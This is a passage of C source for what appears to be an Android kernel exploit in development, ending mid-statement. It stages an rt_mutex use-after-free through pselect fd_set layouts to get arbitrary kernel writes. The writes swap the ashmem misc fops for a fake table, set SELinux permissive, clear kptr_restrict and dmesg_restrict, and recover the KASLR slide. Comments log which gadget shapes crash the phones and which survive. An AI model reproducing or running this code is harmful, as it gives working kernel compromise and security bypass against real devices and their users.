#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
/*
 * MODE4_CHAIN=1 (3 phases — legacy; phase1 MISC-16 parent softboots on CPH):
 *   1 ZERO_NAME / 2 ZERO_OWNER / 3 ION_SAFE
 *
 * MODE4_ZION=1 (2 phases — name zero then ION; name left softboots on CPH):
 *   1 NAME0 / 2 ION
 *
 * MODE4_PAD3=1 (3 phases — pad toxic neighbors then fops slot):
 *   Theory: only-left links left as rb_node; walk of left+8/+16 softboots when
 *   those hold kernel ptrs. Zero MISC+16 then MISC+8 first (parent_color=0),
 *   then only-left left=MISC parent=fake_fops → *MISC=fake_fops with quiet kids.
 *   1 PAD_HI: left=MISC+16, parent_color=0
 *   2 PAD_MID: left=MISC+8,  parent_color=0
 *   3 FOPS:    left=MISC,    parent=fake_fops
 *
 * MODE4_ZI=1 (2 phases — past only-left MISC blocker):
 *   Why: only-left left=MISC softboots because re-enqueue walks W0.left=MISC.
 *   Leaf ZERO_NAME (left=right=0, parent=MISC-16) survived and zeros name.
 *   Then ION root (parent=1,right=fake_fops leaf,left=0,lock=MISC-8) writes
 *   *MISC without ever setting W0.left=MISC.
 *   1 ZERO_NAME leaf *name=0
 *   2 ION_SAFE root *MISC=fake_fops
 *
 * MODE4_WION=1 (2 phases — wait_lock clear without name=NULL):
 *   wait_lock is u32 at &ashmem_misc.name (MISC-8). qspinlock unlocked iff 0.
 *   only-left *name = P0_PAGE_OFFSET (0xffffff8000000000) → low32=0 → wait_lock=0
 *   while name stays a high canonical kernel-ish value (not NULL).
 *   Then ION root *MISC=fake_fops (left=0, no toxic re-enqueue walk).
 *   1 WAITLOCK0 only-left left=MISC-8 parent=PAGE_OFFSET
 *   2 ION_SAFE
 *
 * MODE4_ZIO=1 (3 phases — preferred product path 2026-08-16):
 *   ION lock=MISC-8 overlays: wait_lock=name, waiters=MISC, owner=MISC+16.
 *   ZERO_NAME ALIVE (consumer); bare ION after zero softboots — likely garbage
 *   owner at MISC+16. Zero owner then root-erase *MISC=fake_fops.
 *   1 ZERO_NAME leaf *name=0 (wait_lock)
 *   2 ZERO_OWNER leaf *(MISC+16)=0 (rt_mutex.owner overlay)
 *   3 ION_SAFE parent=1 right=fake_fops left=0 lock=MISC-8
 */
static int g_mode4_chain_phase; /* 0=off; CHAIN/ZIO 1..3; ZION/ZI/WION 1..2; PAD3 1..3 */
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  /*
   * CRITICAL (CPH2521): mode4 used to force delay=0 so the consumer punched
   * sched_setattr/FUTEX immediately as select entered → softboot race.
   * NO_CONSUMER survives; full path with delay=0 softboots.
   * Default: staggered ≥50ms; override with PSELECT_ROUTE_DELAY_USEC=N.
   */
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC", -1, -1, 1000000);
  if (override >= 0)
    return override;

  static const int delays[] = {
    50000, 80000, 100000, 120000, 150000, 30000, 200000, 70000,
  };
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off);

#include <netinet/in.h>
#include <signal.h>

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

int pselect_shift_override = -100;
atomic_int ss_measure_go = 0;
uintptr_t sc_task_override = 0; /* SC_*: word8 task (0=init_task default) */

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  {
    extern int pselect_shift_override;
    if (pselect_shift_override != -100)
      shift = pselect_shift_override;
  }
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

/* VERIFY_SWAP table-offset sweep index (persisted on /sdcard so fires
 * continue the sweep across runs). */
static int vs_x_idx_load(void) {
  int v = 0;
  FILE *f = fopen("/sdcard/ghostlock/aarif/vs_x_idx", "r");
  if (f) {
    if (fscanf(f, "%d", &v) != 1) v = 0;
    fclose(f);
  }
  return v;
}
static void vs_x_idx_store(int v) {
  FILE *f = fopen("/sdcard/ghostlock/aarif/vs_x_idx", "w");
  if (f) {
    fprintf(f, "%d", v);
    fclose(f);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  /*
   * FD materialization modes (stamp words ARE the fd_set bitmasks):
   *
   * SPARSE (MODE4_SPARSE_FDS=1): sentinel only → select often EBADF (errno 9)
   *   if stamp sets bits for closed fds; punch window too short.
   *
   * BIT (default legacy): dup2 only bits that are set → for MISC/fake_fops
   *   words that sets many random low fds; softboot history on CPH.
   *
   * OPEN_ALL (MODE4_OPEN_ALL_FDS=1, default for E2/E2_SPARSE/CLASSIC/F):
   *   open EVERY fd in [0, NFDS) to a dummy so ANY stamp bit pattern is
   *   valid for select (no EBADF), without "only the sparse MISC bits".
   *   Overlay bit pattern in userspace sets still carries the stamp.
   */
  int open_all = env_flag("MODE4_OPEN_ALL_FDS", 0) ||
                 ((env_flag("MODE4_EXP_E2", 0) || env_flag("MODE4_EXP_F", 0) ||
                   env_flag("MODE4_E2_SPARSE", 0) ||
                   env_flag("MODE4_CLASSIC_MAPPED", 0) ||
                   env_flag("MODE4_CLASSIC_LEAF", 0) ||
                   env_flag("MODE4_CLASSIC_NOP", 0) ||
                   env_flag("MODE4_ZERO_NAME", 0) ||
                   env_flag("MODE4_CHAIN", 0) ||
                   env_flag("MODE4_ZION", 0) ||
                   env_flag("MODE4_ZI", 0) ||
                   env_flag("MODE4_WION", 0) ||
                   env_flag("MODE4_ZIO", 0) ||
                   env_flag("MODE4_PAD3", 0) ||
                   env_flag("MODE4_FOPS_SLOT", 0) ||
                   env_flag("MODE4_KIMAGE_MISC", 0) ||
                   env_flag("MODE4_P0_MISC", 0) ||
                   env_flag("MODE4_ION_ROOT", 0) ||
                   env_flag("MODE4_ION_SAFE", 0) ||
                   env_flag("MODE4_ION_FOPS", 0) ||
                   env_flag("MODE4_EXP_N", 0)) &&
                  !env_flag("MODE4_SPARSE_FDS", 0) &&
                  !env_flag("MODE4_FULL_FDS", 0));
  int sparse = env_flag("MODE4_SPARSE_FDS", 0) && !open_all;

  if (sparse) {
    dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
    FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    pr_info("pselect SPARSE_FDS=1 (sentinel only; may EBADF)\n");
    return;
  }

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  if (open_all) {
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++)
      dup2(high_read, fd);
    pr_info("pselect OPEN_ALL_FDS=1 (0..%d open; stamp bits safe for select)\n",
            PSELECT_ROUTE_NFDS - 1);
  } else {
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
      if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
        dup2(high_read, fd);
      }
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                          ? active_offsets->off_init_task
                          : INIT_TASK_OFF;
    uint64_t it = data_addr(KIMAGE_TEXT_BASE + it_off);
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task : it);
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };
  /*
   * waiter_word N is placed at stack word (PSELECT_SHIFT + N).
   * With default Ace layout, waiter base sits at word 2, so field at
   * struct offset O is waiter_word = 2 + O/8.
   *
   * 6.12 rt_waiter_node: task@0x50 lock@0x58 → words 12/13
   * 5.10 plain rb_node:  task@0x30 lock@0x38 → words 8/9
   *   (Quest IonStack / CPH2521 disasm)
   */
#ifdef GHOSTLOCK_KERNEL_5_10
  /*
   * CPH2521 lessons:
   *  - Full stack MAIN-tree write gadget (parent=fake_fops,right=MISC) softboots
   *    at select (tree walks treat MISC as rb_node).
   *  - Stack PI-only gadget survived but cfi errno=22 (write not committed).
   *  - IonStack/A155N FOPS use SIMPLE pselect (in0=fake_w0, ex=task/lock/wake)
   *    + heap W0 pi_tree write; pi_waiters=0 on fake_task.
   *
   * Mode4 default: IonStack simple layout (or PSELECT_SIMPLE_LAYOUT=1).
   * Non-mode4 / MODE4_FULL_STACK=1: full 5.10 waiter words with PI gadget only
   * (main tree parent=1,0,0 — never put MISC on main tree).
   */
  {
    uint64_t init_task_off =
        (active_offsets && active_offsets->off_init_task)
            ? active_offsets->off_init_task
            : INIT_TASK_OFF;
    /* Must be P0 data alias — raw KIMAGE VA softboots when walked as task. */
    uint64_t init_task = data_addr(KIMAGE_TEXT_BASE + init_task_off);
    /* CPH2521: IonStack SIMPLE softboots at pselect; full-stack PI survived
     * to CFI probe. Default FULL stack; set MODE4_SIMPLE=1 to force simple. */
    int use_simple = env_flag("PSELECT_SIMPLE_LAYOUT", 0) ||
                     env_flag("MODE4_SIMPLE", 0);
    if (use_simple) {
      /* IonStack / Root-My-Galaxy FOPS pselect shape */
      fdset_put_word(in, 0, fake_w0);
      fdset_put_word(in, 1, 0);
      fdset_put_word(in, 2, 0);
      fdset_put_word(in, 3, 0);
      fdset_put_word(ex, 0, init_task);
      fdset_put_word(ex, 1, fake_lock);
      fdset_put_word(ex, 2, 3);
      fdset_put_word(ex, 3, 0);
      pr_info("stack mode4 SIMPLE in0=fake_w0 ex0=%016llx(init_task_p0) "
              "ex1=fake_lock ex2=3 (heap W0 pi write)\n",
              (unsigned long long)init_task);
    } else {
      uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
      /* word8 = init_task: its on_rq==1 makes the post-erase
       * wake_up_process a ttwu fast-path no-op (F27-proven safe). A
       * zeroed fake task reaches p->sched_class->task_woken == NULL. */
      uint64_t stack_task = init_task;
      if ((pselect_custom_write == 4 && fake_fops) ||
          env_flag("MODE4_DATAONLY", 0)) {
        uint64_t misc_off =
            (active_offsets && active_offsets->off_ashmem_misc_fops)
                ? active_offsets->off_ashmem_misc_fops
                : ASHMEM_MISC_FOPS_OFF;
        uint64_t misc = data_addr(KIMAGE_TEXT_BASE + misc_off);
        if (!sc_task_override)
          stack_task = init_task;
        if (env_flag("MODE4_TASK_FAKE", 0))
          stack_task = fake_task;

        /*
         * MODE4_A53_STAMP=1: exact root-my-galaxy-clean (SM-A536E) stamp layout.
         * Samsung poc.c setup_stamp (no shift):
         *   write_set[1] = target-8; write_set[2] = value;
         *   except_set[2] = init_task; except_set[3] = fake_lock;
         * This is NOT the same as our shift=-2 waiter-word map. Experiment only.
         * Default stays clean plateau (survive→cfi22).
         */
        if (env_flag("MODE4_A53_STAMP", 0)) {
          memset(in, 0, sizeof(*in));
          memset(out, 0, sizeof(*out));
          memset(ex, 0, sizeof(*ex));
          fdset_put_word(out, 1, misc - 8); /* classic parent */
          fdset_put_word(out, 2, fake_fops); /* classic right = value */
          fdset_put_word(ex, 2, init_task);
          fdset_put_word(ex, 3, fake_lock);
          pr_info("stack mode4 A53_STAMP write[1]=%016llx(MISC-8) "
                  "write[2]=%016llx(fake_fops) ex[2]=init_task ex[3]=fake_lock "
                  "(no shift; Samsung layout)\n",
                  (unsigned long long)(misc - 8),
                  (unsigned long long)fake_fops);
          goto stack_words_done;
        }

        /*
         * Experiment A — MODE4_CLASSIC_MAPPED=1:
         *   Classic only-right stamp on STACK MAIN rb_node (erase target A):
         *     parent_color = MISC-8, right = fake_fops, left = 0
         *   task/lock PRESERVED at waiter words 8/9 (init_task + fake_lock).
         *   pi_tree zeroed. shift=-2 maps tree → in[] (not task/lock slots).
         * Softboot risk if tree walks MISC before erase — env-gated only.
         *
         * Experiment B — MODE4_PI_CLASSIC=1 (fallback if A fails):
         *   Classic stamp on STACK PI tree @ +0x18 (erase target B, top only):
         *     pi parent=MISC-8, pi right=fake_fops, pi left=0; main tree clean.
         *   Stack prio=1 + W0 prio=200 so stack is higher prio than spray
         *   (see util.c) aiming for top-waiter PI erase path.
         *
         * Experiment E — MODE4_EXP_E=1:
         *   Main only-right stamp with PARENT IN SPRAY (not MISC):
         *     parent_color = page+SCRATCH (inert rb_node), right=fake_fops, left=0
         *   Survives (proven). Does NOT redirect MISC (parent≠MISC-8).
         *
         * Experiment E2 — MODE4_EXP_E2=1:
         *   Main only-right INVERTED write (rb_erase first store *right=parent):
         *     parent_color = fake_fops, right = MISC (fops slot addr), left = 0
         *   → *MISC = fake_fops if erase runs. Softboot risk (MISC as right child).
         *
         * Experiment C — MODE4_TOP_PI=1:
         *   Same classic PI stamp as B (pi parent=MISC-8, right=fake_fops) but
         *   stack prio=0 and W0 prio=250 so stack is strongly preferred top
         *   for PI erase path (erase target B).
         *
         * Experiment F — MODE4_EXP_F=1 (source-driven, sm8475 rtmutex.c):
         *   Goal: make rt_mutex_adjust_pi → adjust_prio_chain REQUEUE erase
         *   the UAF waiter main node with only-right write to MISC.
         *   From source:
         *     - dequeue skips RB_EMPTY_NODE; need non-empty tree_entry
         *     - only-right: left=0, right=MISC, parent=fake_fops → *MISC=fake_fops
         *     - adjust_pi early-outs if waiter_equal(prio/deadline, task)
         *   Stamp main E2 shape + prio/deadline forced unequal to normal task.
         *   Softboot risk (MISC as right) — env only. Prefer clean boot.
         *
         * Experiment G — MODE4_REF_LEFT=1 (oppo-ghostlock-ref default shape):
         *   only-LEFT rb_erase: right=0, left=MISC, parent=fake_fops
         *     → *MISC = parent_color (Ghidra rb_erase right==0 branch).
         *   Stack stamps MAIN and PI (same as Find N2 / Xiaomi-13-pro ref).
         *   Heap W0.pi matches (util.c). Never default; clean-boot only.
         *   MODE4_REF_LEFT_PI=1: PI-only (main 0) softer probe.
         *
         * Experiment ION — MODE4_ION_ROOT=1 (IonStack root-slot write):
         *   waiter->lock = MISC-8 so rt_mutex.waiters root sits at MISC
         *   (Image: waiters @ lock+8). Main node is only-right ROOT child:
         *     parent_color=1 (null parent), right=fake_fops, left=0
         *   rb_erase only-right + parent==0 → *root = right ⇒ *MISC=fake_fops
         *   Does NOT put MISC in left/right of the erased node (avoids E2 shape).
         *   Requires EDEADLK UAF + setprio; wait_lock at MISC-8 must trylock OK.
         *   Softboot risk if MISC-8 is not a safe spinlock — env only.
         *
         * Experiment N — MODE4_EXP_N=1 / MODE4_ION_FOPS=1:
         *   Avoid MISC-as-tree-child softboot (A/E2) and MISC-8 wait_lock fail (J).
         *   Two env-compatible shapes (same flag family):
         *
         *   N1 MODE4_ION_FOPS=1 (preferred first fire):
         *     Ion root write into ashmem_fops.WRITE slot:
         *       lock = ashmem_fops + FOPS_READ_OFF (0x10)  // .read == 0 → wait_lock OK
         *       parent=1, right=configfs_bin_write JT, left=0
         *     → *(ashmem_fops+0x18) = write JT if erase runs.
         *     Table may be RO (softboot) or AAW may not match full fake_fops
         *     redirect — still probes lock-identity + non-MISC geometry.
         *
         *   N2 MODE4_EXP_N=1 (classic parent in fops table zero zone):
         *     parent = ashmem_fops+0x10 (.read slot addr), right=write JT, left=0
         *     lock=fake_lock (wait_lock=0). Unlinked only-right → parent->rb_right
         *     write lands at ashmem_fops+0x18. Parent chain starts at .read==0
         *     (safer walk than MISC-8 / name ptr).
         */
        uint64_t tree_pc = 0, tree_r = 0, tree_l = 0;
        uint64_t stack_prio = 1;
        uint64_t stack_deadline = 0;
        uint64_t stack_lock = fake_lock;
        /*
         * MODE4_VERIFY_SWAP (phased, reclaim-safe): g_mode4_chain_phase selects
         * the stamp. Phase 1 = spray placement oracle (marker write into our
         * own sprayed table: *(fake_fops+0x90)=fake_fops+0x80), verified by
         * wproof_spray_verify() after the walk — abort ALIVE if the skb spray
         * did not reclaim the leaked mm page. Phase 2 = MISC only-left clone
         * swap (*ashmem_misc.fops = fake_fops). Both phases use a STATIC
         * all-zero lock slot (nfulnl_loggers+0x40 / +0x60, Image-verified
         * zeros, runtime-writable .data, inert while ulog unused) when
         * MODE4_BSS_LOCK=1, so the walk never dereferences spray memory:
         * wait_lock=0 (trylock ok), waiters empty, owner=0 (clean exit).
         * One walk per slot (fresh slot per phase) avoids the rb_next/
         * leftmost hazard of erasing a node from a tree that already links
         * it. See docs/WALK_DETERMINISM_MASTER_PLAN_2026-08-17.md.
         */
        if (env_flag("MODE4_QEMU_MAP", 0)) {
          /*
           * ALIGNMENT MAPPER: every waiter word gets a unique tag
           * 0xDEAD0000_000000ii (ii = fdset word index). The walk's
           * trylock on waiter->lock faults at the tag it finds there —
           * the panic fault address names the word index actually
           * sitting at waiter+0x38. One run = exact alignment truth.
           */
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          (void)ph;
          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
          tree_pc = 0xDEAD0000000000C0ULL + 0x02; /* word2 tag (waiter pc) */
          tree_r = 0xDEAD0000000000C0ULL + 0x03;
          tree_l = 0xDEAD0000000000C0ULL + 0x04;
          pi_parent = 0xDEAD0000000000C0ULL + 0x05;
          pi_right = 0xDEAD0000000000C0ULL + 0x06;
          pi_left = 0xDEAD0000000000C0ULL + 0x07;
          stack_lock = 0xDEAD0000000000C0ULL + 0x09;
          stack_prio = 3; /* waiter_equal false so the walk proceeds */
          stack_deadline = 0xDEAD0000000000C0ULL + 0x0B;
          pr_info("QEMU_MAP tags armed\n");
        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
            env_flag("MODE4_SC_UMASK", 0)) {
          /* Two benign zero-stores to unmask kernel info sources:
           * ph1: *(P0 dmesg_restrict)=0  ph2: *(P0 kptr_restrict)=0
           * (kallsyms: dmesg_restrict B 0x02A0?D20, kptr_restrict D 0x027BCF68)
           * then userspace reads dmesg/kallsyms for the KASLR slide. */
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
          /* ph1: selinux_state qword0 = 0 | ph2: kptr_restrict = 0
           * ph3/ph5: bootid oracle (plain store; ph5 prio=139 [3]-exit)
           * ph6: hostname oracle — "PWNED\0" into init_uts_ns.nodename
           *      (shell-readable, harmless, persists; live/dead truth) */
          uint64_t tgt_off = (ph == 1) ? 0x02A793C8ULL : 0x027BCF68ULL;
          uint64_t tgt = (uint64_t)data_addr(KIMAGE_TEXT_BASE + tgt_off);
          if (ph == 3 || ph == 5) {
            uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
                                   ? (uint64_t)active_offsets->off_slide_boot_id
                                   : SLIDE_SYSCTL_BOOTID_OFF;
            tgt = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
          }
          if (ph == 1) {
            /*
             * SELINUX via PLAIN-STORE (F27-proven shape — the zero-write
             * gadget crashes live walks 9/9): value = P0(0x02BB0000) =
             * 0xffffff80_2aab0000-style — LE bytes 00 00 .. .. — so
             * selinux_state.disabled(byte0)=0 AND enforcing(byte1)=0 =
             * PERMISSIVE. The erase's change_child parent = value&~3 =
             * P0(0x02BB0000): quiet zeroed .bss (Image-verified, no
             * kallsyms symbols) — its rb_right(+8) store corrupts only
             * that scratch. avc ptr @ state+8 untouched (qword0 only).
             */
            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
            tree_r = 0;
            tree_l = tgt;
            pi_parent = 0; pi_right = 0; pi_left = 0;
            stack_prio = 3;
            stack_deadline = 0;
            stack_lock = tail + 0x400;
            pr_info("SC_UMASK ph1 PLAIN-STORE selinux val=%016llx\n",
                    (unsigned long long)tree_pc);
            {
              char st[128];
              snprintf(st, sizeof(st),
                       "ph1_plain pc=%016llx l=%016llx lock=%016llx",
                       (unsigned long long)tree_pc,
                       (unsigned long long)tree_l,
                       (unsigned long long)stack_lock);
              live_sync_log("SS", st);
            }
          } else if (ph == 8) {
            /*
             * dmesg_restrict = 0 via PLAIN-STORE (AVC-neutral — unlike the
             * selinux permissive flip which kills the box mid-walk).
             * Value = P0(phys 4GB) = 0xffffff8100000000: low32 = 0 zeroes
             * the int; parent = value&~3 = physmap of phys-0x100000000
             * (inside the 12GB RAM — mapped; the change_child's 8-byte
             * write lands in live RAM, one qword in 12GB). dmesg then
             * exposes the boot "Virtual kernel memory layout" print whose
             * .text line is a RAW address (not %p — unmaskable) = slide.
             */
            tree_pc = 0xffffff8100000000ULL;
            tree_r = 0;
            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x029C9D20ULL);
          } else if (ph == 7) {
            /* ISOLATION TEST: bootid target (ph3 = walk-completing) with
             * the ph1 VALUE (P0 0x02AB0000). Completing walk -> the
             * selinux TARGET is the crasher; crashing -> the VALUE. */
            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
            tree_r = 0;
            tree_l = (uint64_t)data_addr(
                KIMAGE_TEXT_BASE +
                ((active_offsets && active_offsets->off_slide_boot_id)
                     ? (uint64_t)active_offsets->off_slide_boot_id
                     : SLIDE_SYSCTL_BOOTID_OFF));
          } else if (ph == 3 || ph == 5) {
            /* oracle: plain store (F27-proven shape); ph5 = prio-equal
             * early-exit probe ([3] exit, no erase, no wake) */
            tree_pc = tail + 0x40;
            tree_r = 0;
            tree_l = tgt;
          } else if (ph == 6) {
            /* F27-safe shape: pc=tail+0x40 (parent stays in scratch —
             * change_child writes tail+0x10, mapped), l=hostname → the
             * erase stores tail+0x40's bytes into nodename. Box lives,
             * hostname readback shows the landing. */
            tree_pc = tail + 0x40;
            tree_r = 0;
            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x027CBDF1ULL);
          } else {
            /* ZERO-WRITE gadget: pc=(tgt-8)|1 (red: no rebalance),
             * left=right=0 -> Case-1-no-child -> change_child else-branch
             * WRITE_ONCE(parent->rb_right = tgt, NULL) -> *(tgt)=0.
             * Root untouched (parent non-NULL) -> enqueue sees empty tree. */
            tree_pc = (tgt - 8) | 1;
            tree_r = 0;
            tree_l = 0;
          }
          pi_parent = 0; pi_right = 0; pi_left = 0;
          stack_prio = (ph == 5) ? 139 : 3;
          stack_deadline = 0;
          stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
          if (env_flag("MODE4_QEMU_TRAP", 0)) {
            /* lock = RO text: a trylock fault at the text address PROVES
             * the walk reads our word9 (stamp -> waiter->lock). */
            stack_lock = (uint64_t)text_addr(
                KIMAGE_TEXT_BASE +
                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
            pr_info("QEMU_TRAP lock=%016llx\n",
                    (unsigned long long)stack_lock);
          }
          pr_info("stack mode4 SC_UMASK ph=%d tgt=%016llx val=%016llx\n",
                  ph, (unsigned long long)tree_l,
                  (unsigned long long)tree_pc);
        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
            env_flag("MODE4_SC_TRAP3", 0)) {
          /* ERASE-EXECUTION trap: parent_color = text|1 -> Case-1-else's
           * __rb_change_child WRITES parent(text)->rb_right -> RO store ->
           * softboot IFF the rb_erase store path truly executes. */
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          (void)ph;
          tree_pc = (uint64_t)text_addr(KIMAGE_TEXT_BASE +
                       (active_offsets ? active_offsets->off_ashmem_ioctl : 0)) | 1;
          tree_r = 0;
          tree_l = KIMAGE_TEXT_BASE +
                   ((active_offsets && active_offsets->off_slide_boot_id)
                        ? (uint64_t)active_offsets->off_slide_boot_id
                        : SLIDE_SYSCTL_BOOTID_OFF);
          pi_parent = 0; pi_right = 0; pi_left = 0;
          stack_prio = 3;
          stack_deadline = 0;
          stack_lock = KIMAGE_TEXT_BASE +
                       (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0) + 0x400;
          pr_info("stack mode4 SC_TRAP3 erase-trap pc=text|1 left=bootid lock=tail\n");
        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
            env_flag("MODE4_SC_DIAG", 0)) {
          /* Stamp-presence discriminator:
           * ph1: *bootid = tail+8 (store; benign lock) -> readback
           * ph2: SAME store but lock=text -> softboot IFF stamp present
           * (walk reads our word9). silent+softboot => store-path guard;
           * silent+silent => stamp missed the rt_waiter slot this boot. */
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
          uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
                                 ? (uint64_t)active_offsets->off_slide_boot_id
                                 : SLIDE_SYSCTL_BOOTID_OFF;
          tree_pc = tail + 8;
          tree_r = 0;
          tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
          pi_parent = 0; pi_right = 0; pi_left = 0;
          stack_prio = 3;
          stack_deadline = 0;
          stack_lock = (ph == 2)
              ? (uint64_t)text_addr(KIMAGE_TEXT_BASE +
                    (active_offsets ? active_offsets->off_ashmem_ioctl : 0))
              : tail + 0x400;
          pr_info("stack mode4 SC_DIAG ph=%d *bootid=tail+8 lock=%016llx (%s)\n",
                  ph, (unsigned long long)stack_lock,
                  ph == 2 ? "TEXT TRAP" : "tail slot");
        } else if (env_flag("MODE4_STATIC_CHAIN", 0)) {
          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
          /* P0 physmap alias — the ONLY target form the walk's stores
           * actually land through (F27 proof: P0 bootid readback changed;
           * KIMAGE form writes vanish). */
          uint64_t tail =
              (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                  (active_offsets
                                       ? active_offsets->off_bss_tail_lock
                                       : 0));
          struct {
            uint64_t slot; /* TAIL-relative target (0 = swap MISC) */
            uint64_t val;  /* value to store */
          } tab[7];
          tab[0].slot = 0x50; /* PH-ORDER EXPERIMENT: ioctl first */
          tab[0].val = fops_runtime_text(
              active_offsets ? active_offsets->off_ashmem_ioctl : 0,
              ASHMEM_IOCTL_OFF);
          tab[1].slot = 0x18;
          tab[1].val = fops_runtime_text(
              active_offsets ? active_offsets->off_configfs_bin_write_iter : 0,
              CONFIGFS_BIN_WRITE_ITER_OFF);
          tab[2].slot = 0x10;
          tab[2].val = fops_runtime_text(
              active_offsets ? active_offsets->off_configfs_read_iter : 0,
              CONFIGFS_READ_ITER_OFF);
          tab[3].slot = 0x60;
          tab[3].val = fops_runtime_text(
              active_offsets ? active_offsets->off_ashmem_mmap : 0,
              ASHMEM_MMAP_OFF);
          tab[4].slot = 0x70;
          tab[4].val = fops_runtime_text(
              active_offsets ? active_offsets->off_ashmem_open : 0,
              ASHMEM_OPEN_OFF);
          tab[5].slot = 0x80;
          tab[5].val = fops_runtime_text(
